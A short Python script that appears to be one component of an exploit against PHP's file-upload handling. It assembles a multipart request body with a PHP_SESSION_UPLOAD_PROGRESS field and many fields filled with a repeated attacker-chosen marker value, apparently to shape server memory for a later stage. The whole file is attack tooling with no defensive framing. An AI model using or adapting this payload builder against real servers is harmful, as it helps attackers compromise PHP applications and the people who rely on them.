#!/usr/bin/env python3
# Flexible E consumer body builder.
#   argv: out  boundary  marker_hex  nfields  fieldsize
# Builds: [progress field][nfields x controlled-value fields][file part], using
# the given boundary. The controlled value = marker (8 bytes) repeated to size.
import sys, binascii
out = sys.argv[1]
bnd = (sys.argv[2] if len(sys.argv) > 2 else "V").encode()
marker = binascii.unhexlify(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] else b"ABCDEFGH"
nfields = int(sys.argv[4]) if len(sys.argv) > 4 else 0
fsize = int(sys.argv[5]) if len(sys.argv) > 5 else 64

D = b"--" + bnd + b"\r\n"
val = (marker * ((fsize // len(marker)) + 1))[:fsize]
body = D + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
for i in range(nfields):
    body += D + (b'Content-Disposition: form-data; name="p%d"\r\n\r\n' % i) + val + b"\r\n"
body += D + b'Content-Disposition: form-data; name="f"; filename="t"\r\n\r\nZ\r\n'
body += b"--" + bnd + b"--\r\n"
open(out, "wb").write(body)
sys.stderr.write("len=%d bnd=%r fields=%d fsize=%d\n" % (len(body), bnd, nfields, fsize))
